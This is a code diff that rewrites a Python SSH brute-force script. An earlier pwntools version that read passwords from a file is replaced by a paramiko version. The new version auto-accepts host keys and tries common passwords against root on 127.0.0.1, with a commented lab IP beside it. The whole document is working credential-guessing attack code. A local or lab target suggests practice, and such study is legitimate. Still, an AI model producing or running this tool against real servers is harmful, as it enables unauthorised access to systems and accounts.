@@ -1,24 +1,35 @@
-from pwn import *
 import paramiko
+import socket # Used to handle connection timeouts
 
-# Replace the following placeholders with your specific values
-host = "your_target_host_ip"
-username = "your_target_username"
-password_file_path = "path/to/your/password/file.txt"
-attempts = 0
+def ssh_brute_force(host, username, password):
+    client = paramiko.SSHClient()
+    
+    # This line tells the script to automatically accept the server's "SSH Key"
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        # Try to connect
+        client.connect(hostname=host, username=username, password=password, timeout=3)
+    except paramiko.AuthenticationException:
+        # This means the password was WRONG
+        return False
+    except socket.error:
+        # This means the server is down or blocking us
+        print("[!] Connection Error: Is the IP correct?")
+        return False
+    else:
+        # This runs if NO error occurred
+        print(f"[+] Success! Valid Password: {password}")
+        return True
+    finally:
+        client.close()
 
-with open("ssh-common-passwords.txt", "r") as password_list:
-    for password in password_list:
-        password = password.strip("\n")
-        try:
-            print("[{}] Attempting password: '{}'!".format(attempts, password))
-            response = ssh(host=host, user=username, password=password, timeout=1)
-            if response.connected():
-                print("[>] Valid password found: '{}'!".format(password))
-                response.close()
-                break
+# --- SETUP ---
+target_ip = "127.0.0.1" #10.0.2.15" # Change to your target's IP
+user = "root"
+passwords = ["123456", "admin", "password", "kali", "dragon"]
 
-            response.close()
-        except paramiko.ssh_exception.AuthenticationException:
-            print("[X] Invalid password!")
-        attempts += 1
+for pw in passwords:
+    print(f"[*] Trying: {pw}")
+    if ssh_brute_force(target_ip, user, pw):
+        break # Stop the loop if we find it
